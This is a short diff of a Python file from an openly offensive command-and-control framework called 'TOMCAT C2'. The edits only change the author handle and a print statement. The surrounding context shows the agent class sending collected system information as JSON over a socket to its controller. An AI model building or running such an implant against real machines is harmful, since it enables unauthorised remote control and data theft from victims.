@@ -1,7 +1,7 @@
 #!/usr/bin/python3
 # TOMCAT C2 Frameworks
-# Author: XTM26
-# GitHub: XTM26
+# Author: MatrixTM26
+# GitHub: MatrixTM26
 
 """
 [+] NOTE:
@@ -9,7 +9,7 @@
     -- If you want to expand this project, ask owner for collaboration instead.
 
     Thanks for understanding.
-    ~XTM26
+    ~MatrixTM26
 """
 
 import base64
@@ -232,7 +232,7 @@ class TOMCATC2AGENT:
             }
             InfoJson = json.dumps(Info)
             self.Socket.sendall(InfoJson.encode())
-            print(f"[+] System Info Sent")
+            print("[+] System Info Sent")
             time.sleep(1.5)
             self.Socket.settimeout(0.1)
             try:
